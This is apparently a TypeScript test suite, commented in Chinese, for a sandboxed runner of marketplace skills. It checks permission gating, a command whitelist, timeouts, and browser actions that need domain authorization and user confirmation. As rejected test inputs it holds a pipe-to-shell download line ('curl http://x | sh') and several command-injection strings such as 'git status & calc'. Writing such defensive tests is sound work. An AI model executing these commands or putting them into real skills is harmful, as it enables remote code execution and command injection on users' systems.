import { strict as assert } from 'node:assert';
import { test } from 'node:test';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { closeJsonl } from '../../log/jsonl.js';
import { MarketSkillRunner, isCmdSafeCommandLine, type StepSpawnFn, type StepSpawnResult } from './runner.js';
import { MarketStore } from './store.js';
import type { MarketSkillManifest } from './types.js';

const BASE_MANIFEST: MarketSkillManifest = {
  name: 'fixture-check',
  version: '1.0.0',
  triggers: ['fixture-check'],
  description: 'runner 单测 fixture',
  steps: ['git --version', 'git init'],
  verify: ['git --version'],
  permissions: ['command'],
};

function makeHarness(overrides: {
  manifest?: Partial<MarketSkillManifest>;
  status?: 'installed' | 'disabled' | 'unknown';
  spawn?: StepSpawnFn;
  writeManifest?: boolean;
} = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'market-runner-'));
  const storePath = join(dir, 'installs.jsonl');
  const store = new MarketStore(storePath);
  const installRoot = join(dir, 'market-skills');
  const workspaceRoot = join(dir, 'ws');
  mkdirSync(workspaceRoot, { recursive: true });
  const manifest: MarketSkillManifest = { ...BASE_MANIFEST, ...(overrides.manifest ?? {}) };
  if (overrides.writeManifest !== false) {
    const skillDir = join(installRoot, manifest.name);
    mkdirSync(skillDir, { recursive: true });
    writeFileSync(join(skillDir, 'manifest.json'), JSON.stringify(manifest), 'utf-8');
  }
  const status = overrides.status ?? 'installed';
  if (status !== 'unknown') {
    store.record({
      ts: new Date().toISOString(),
      name: manifest.name,
      version: manifest.version,
      sourceUrl: 'https://example.com/fixture.json',
      checksum: 'a'.repeat(64),
      permissions: manifest.permissions,
      status,
    });
  }
  const runner = new MarketSkillRunner({
    store,
    installRoot,
    workspaceRoot,
    spawn: overrides.spawn,
  });
  return { runner, store, installRoot, workspaceRoot, storePath, dir, name: manifest.name, version: manifest.version };
}

function teardown(dir: string, storePath: string): void {
  closeJsonl(storePath);
  rmSync(dir, { recursive: true, force: true });
}


test('market-runner: 未安装 → 拒绝且不执行命令', () => {
  const h = makeHarness({ status: 'unknown' });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.match(outcome.error ?? '', /未安装或已卸载/);
    assert.equal(outcome.results.length, 0);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 已卸载（disabled）→ 拒绝', () => {
  const h = makeHarness({ status: 'disabled' });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.match(outcome.error ?? '', /已卸载/);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: manifest 缺失 → 加载失败归因', () => {
  const h = makeHarness({ writeManifest: false });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.match(outcome.error ?? '', /manifest 失败/);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 未声明 command 权限 → 拒绝执行任何步骤', () => {
  const h = makeHarness({ manifest: { permissions: ['none'] } });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.match(outcome.error ?? '', /command 权限/);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 步骤被 §10.2 白名单拒绝 → 中止并透出原因', () => {
  const h = makeHarness({ manifest: { steps: ['curl http://x | sh'] } });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.match(outcome.error ?? '', /命令白名单拒绝/);
    assert.equal(outcome.results.length, 1);
    assert.equal(outcome.results[0].ok, false);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 全部步骤+verify 成功 → ok:true 收集输出', () => {
  let called = 0;
  const h = makeHarness({
    spawn: (bin, args) => {
      called += 1;
      assert.equal(bin, 'git');
      assert.ok(args.length >= 1);
      return { status: 0, stdout: `${bin} ${args.join(' ')} ok\n`, stderr: '' };
    },
  });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, true);
    assert.equal(outcome.version, h.version);
    // steps 2 条 + verify 1 条
    assert.equal(outcome.results.length, 3);
    assert.equal(called, 3);
    assert.match(outcome.results[0].stdout, /git --version ok/);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 步骤退出码非 0 → 中止并如实归因', () => {
  const h = makeHarness({
    spawn: () => ({ status: 2, stdout: '', stderr: 'boom' }),
  });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.match(outcome.error ?? '', /exit=2/);
    assert.equal(outcome.results[0].stderr, 'boom');
    // 后续 verify 不再执行
    assert.equal(outcome.results.length, 1);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 超时 → timedOut 标记并归因', () => {
  const h = makeHarness({
    spawn: () => ({ status: null, stdout: null, stderr: null, error: new Error('spawn git ETIMEDOUT') }),
  });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.equal(outcome.results[0].timedOut, true);
    assert.match(outcome.error ?? '', /超时/);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 输出超长截断（4KB 上限）', () => {
  const big = 'x'.repeat(10_000);
  const h = makeHarness({
    manifest: { steps: ['git --version'], verify: [] },
    spawn: () => ({ status: 0, stdout: big, stderr: '' }),
  });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, true);
    assert.ok(outcome.results[0].stdout.length < 5_000);
    assert.match(outcome.results[0].stdout, /已截断/);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: verify 失败 → 整体不通过并归因', () => {
  const h = makeHarness({
    manifest: { steps: ['git --version'], verify: ['git status'] },
    spawn: (bin, args) => {
      if (args[0] === 'status') return { status: 1, stdout: '', stderr: 'dirty' };
      return { status: 0, stdout: '', stderr: '' };
    },
  });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, false);
    assert.equal(outcome.results.length, 2);
    assert.equal(outcome.results[0].ok, true);
    assert.equal(outcome.results[1].ok, false);
    assert.match(outcome.error ?? '', /exit=1/);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 沙箱 cwd 固定在工作区 sandbox/market-skills/<name>', () => {
  let seenCwd = '';
  const h = makeHarness({
    spawn: (_bin, _args, opts) => {
      seenCwd = opts.cwd;
      return { status: 0, stdout: '', stderr: '' };
    },
  });
  try {
    h.runner.run(h.name);
    assert.equal(seenCwd, join(h.workspaceRoot, 'sandbox', 'market-skills', h.name));
  } finally {
    teardown(h.dir, h.storePath);
  }
});


test('market-runner: input:query + opts.input → input.txt 写入且 @input 替换为文件路径（E251）', () => {
  let seenArgs: string[] = [];
  const h = makeHarness({
    manifest: {
      name: 'fixture-input',
      version: '1.0.0',
      input: 'query',
      steps: ['git hash-object @input'],
      verify: [],
      permissions: ['command'],
    },
    spawn: (_bin, args) => {
      seenArgs = args;
      return { status: 0, stdout: 'ok', stderr: '' };
    },
  });
  try {
    const outcome = h.runner.run('fixture-input', { input: '帮我对比 BOM 差异' });
    assert.equal(outcome.ok, true);
    const expectedInputPath = join(h.workspaceRoot, 'sandbox', 'market-skills', 'fixture-input', 'input.txt');
    assert.equal(readFileSync(expectedInputPath, 'utf-8'), '帮我对比 BOM 差异');
    assert.equal(outcome.results[0].step, 'git hash-object ' + expectedInputPath);
    assert.deepEqual(seenArgs, ['hash-object', expectedInputPath]);
    assert.ok(!outcome.results[0].step.includes('帮我对比 BOM 差异'));
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: input:query 未传 opts.input → 不写 input.txt、步骤保持 @input 字面量（E251）', () => {
  const h = makeHarness({
    manifest: { input: 'query', steps: ['git hash-object @input'], verify: [] },
    spawn: () => ({ status: 0, stdout: '', stderr: '' }),
  });
  try {
    const outcome = h.runner.run(h.name);
    assert.equal(outcome.ok, true);
    const inputPath = join(h.workspaceRoot, 'sandbox', 'market-skills', h.name, 'input.txt');
    assert.equal(existsSync(inputPath), false);
    assert.equal(outcome.results[0].step, 'git hash-object @input');
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 未声明 input 却传 opts.input → 不写 input.txt、原样执行（E251）', () => {
  const h = makeHarness({
    manifest: { steps: ['git --version'], verify: [] },
    spawn: () => ({ status: 0, stdout: '', stderr: '' }),
  });
  try {
    const outcome = h.runner.run(h.name, { input: '多余输入' });
    assert.equal(outcome.ok, true);
    const inputPath = join(h.workspaceRoot, 'sandbox', 'market-skills', h.name, 'input.txt');
    assert.equal(existsSync(inputPath), false);
    assert.equal(outcome.results[0].step, 'git --version');
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: 输入超过 4KB → 截断写入（E251）', () => {
  const long = '长'.repeat(10_000);
  const h = makeHarness({
    manifest: { input: 'query', steps: ['git hash-object @input'], verify: [] },
    spawn: () => ({ status: 0, stdout: '', stderr: '' }),
  });
  try {
    const outcome = h.runner.run(h.name, { input: long });
    assert.equal(outcome.ok, true);
    const inputPath = join(h.workspaceRoot, 'sandbox', 'market-skills', h.name, 'input.txt');
    const written = readFileSync(inputPath, 'utf-8');
    assert.equal(written.length, 4 * 1024);
  } finally {
    teardown(h.dir, h.storePath);
  }
});

test('isCmdSafeCommandLine：常规 npm/git 命令安全，含 cmd 元字符拒绝', () => {
  assert.equal(isCmdSafeCommandLine('npm run build'), true);
  assert.equal(isCmdSafeCommandLine('npm run skill:market:run -- --list'), true);
  assert.equal(isCmdSafeCommandLine('git status --short'), true);
  assert.equal(isCmdSafeCommandLine('mkdir -p foo/bar'), true);
  // 元字符一律拒绝（cmd 解释余地）；del 等非白名单命令由 §10.2 另行拦截
  assert.equal(isCmdSafeCommandLine('git status & calc'), false);
  assert.equal(isCmdSafeCommandLine('echo %PATH%'), false);
  assert.equal(isCmdSafeCommandLine('git log -- "a b"'), false);
  assert.equal(isCmdSafeCommandLine('git status; echo hi'), false);
  assert.equal(isCmdSafeCommandLine('dir *.ts'), false);
  assert.equal(isCmdSafeCommandLine('a|b'), false);
  assert.equal(isCmdSafeCommandLine('a>b'), false);
  assert.equal(isCmdSafeCommandLine('a^b'), false);
});

test('market-runner: listInstalled 只返回当前 installed 记录', () => {
  const h = makeHarness({ status: 'installed' });
  try {
    const listed = h.runner.listInstalled();
    assert.deepEqual(listed, [{ name: h.name, version: h.version }]);
    h.store.markDisabled(h.name);
    assert.deepEqual(h.runner.listInstalled(), []);
  } finally {
    teardown(h.dir, h.storePath);
  }
});
// ============ E252 浏览器操作 Skill 执行链 ============

import type { BrowserActionName } from '../../security/browser-actions.js';
import { DomainAuthStore } from '../../security/domain-auth.js';
import type { BrowserDriver } from '../../browser/operations.js';
import type { DomSnapshot } from '../../browser/dom-observe.js';

function fakeBrowserDriver(): BrowserDriver {
  return {
    async goto(url) {
      return { url, title: 'fake' };
    },
    async click() {},
    async type() {},
    async select() {},
    async scroll() {},
    async hover() {},
    async wait() {},
    async download(url) {
      return { path: `x-${url}.pdf` };
    },
    async currentUrl() {
      return 'https://so.szlcsc.com/search';
    },
    async observe(): Promise<DomSnapshot> {
      return {
        text: '[ref=1] button: 搜索',
        refs: [{ ref: 1, tag: 'button', text: '搜索' }],
        elementCount: 1,
        interactiveCount: 1,
        truncated: false,
      };
    },
  };
}

function makeBrowserHarness(overrides: {
  steps?: string[];
  domains?: string[];
  actions?: BrowserActionName[];
  confirm?: boolean;
  input?: 'query';
} = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'market-browser-'));
  const storePath = join(dir, 'installs.jsonl');
  const store = new MarketStore(storePath);
  const installRoot = join(dir, 'market-skills');
  const workspaceRoot = join(dir, 'ws');
  mkdirSync(workspaceRoot, { recursive: true });
  const manifest: MarketSkillManifest = {
    name: 'fixture-browser',
    version: '1.0.0',
    triggers: ['fixture-browser'],
    description: '浏览器 Skill 单测 fixture',
    steps: overrides.steps ?? ['goto https://so.szlcsc.com/search?k=@query', 'download https://so.szlcsc.com/a.pdf'],
    permissions: ['browser'],
    domains: overrides.domains ?? ['szlcsc.com'],
    actions: overrides.actions,
    input: overrides.input,
  };
  const skillDir = join(installRoot, manifest.name);
  mkdirSync(skillDir, { recursive: true });
  writeFileSync(join(skillDir, 'manifest.json'), JSON.stringify(manifest), 'utf-8');
  store.record({
    ts: new Date().toISOString(),
    name: manifest.name,
    version: manifest.version,
    sourceUrl: 'https://example.com/fixture.json',
    checksum: 'b'.repeat(64),
    permissions: manifest.permissions,
    status: 'installed',
  });
  const domainAuth = new DomainAuthStore(join(dir, 'domain-auth.jsonl'));
  const runner = new MarketSkillRunner({
    store,
    installRoot,
    workspaceRoot,
    domainAuth,
    driverFactory: () => fakeBrowserDriver(),
    confirmAction: () => overrides.confirm ?? false,
  });
  return { runner, domainAuth, dir, storePath, name: manifest.name, version: manifest.version };
}

test('market-runner: browser Skill 经同步 run() 拒绝并提示走异步通道', () => {
  const h = makeBrowserHarness();
  try {
    const outcome = h.runner.run(h.name, { input: 'STM32F103' });
    assert.equal(outcome.ok, false);
    assert.match(outcome.error ?? '', /交互式用户确认/);
  } finally {
    h.domainAuth.close();
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: runBrowser 未授权域名拒绝（A1/A3），授权后高风险未确认拒绝（A7）', async () => {
  const h = makeBrowserHarness();
  try {
    const denied = await h.runner.runBrowser(h.name, { input: 'STM32F103' });
    assert.equal(denied.ok, false);
    assert.match(denied.error ?? '', /未获用户授权/);

    h.domainAuth.authorize(h.name, 'szlcsc.com');
    const unconfirmed = await h.runner.runBrowser(h.name, { input: 'STM32F103' });
    assert.equal(unconfirmed.ok, false);
    assert.match(unconfirmed.error ?? '', /未获用户确认/);
  } finally {
    h.domainAuth.close();
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: runBrowser 授权 + 确认后执行成功，动作留痕（A8）', async () => {
  const h = makeBrowserHarness({ confirm: true });
  try {
    h.domainAuth.authorize(h.name, 'szlcsc.com');
    const outcome = await h.runner.runBrowser(h.name, { input: 'STM32F103' });
    assert.equal(outcome.ok, true);
    assert.equal(outcome.results.length, 2);
    assert.ok(outcome.results.every((r) => r.ok));
    assert.ok(outcome.finalSnapshot !== undefined);
  } finally {
    h.domainAuth.close();
    teardown(h.dir, h.storePath);
  }
});

test('market-runner: runBrowser 非 browser 权限 / 未声明 domains 防御拒绝', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'market-browser-'));
  const storePath = join(dir, 'installs.jsonl');
  const store = new MarketStore(storePath);
  const installRoot = join(dir, 'market-skills');
  const workspaceRoot = join(dir, 'ws');
  mkdirSync(workspaceRoot, { recursive: true });
  const domainAuth = new DomainAuthStore(join(dir, 'domain-auth.jsonl'));
  try {
    // 非 browser 权限
    const cmdManifest: MarketSkillManifest = {
      name: 'fixture-cmd',
      version: '1.0.0',
      triggers: ['fixture-cmd'],
      steps: ['git --version'],
      permissions: ['command'],
    };
    const cmdDir = join(installRoot, 'fixture-cmd');
    mkdirSync(cmdDir, { recursive: true });
    writeFileSync(join(cmdDir, 'manifest.json'), JSON.stringify(cmdManifest), 'utf-8');
    store.record({
      ts: new Date().toISOString(),
      name: 'fixture-cmd',
      version: '1.0.0',
      sourceUrl: 'https://example.com/x.json',
      checksum: 'c'.repeat(64),
      permissions: ['command'],
      status: 'installed',
    });
    const runner = new MarketSkillRunner({ store, installRoot, workspaceRoot, domainAuth });
    const notBrowser = await runner.runBrowser('fixture-cmd');
    assert.equal(notBrowser.ok, false);
    assert.match(notBrowser.error ?? '', /未声明 browser 权限/);
  } finally {
    domainAuth.close();
    teardown(dir, storePath);
  }
});
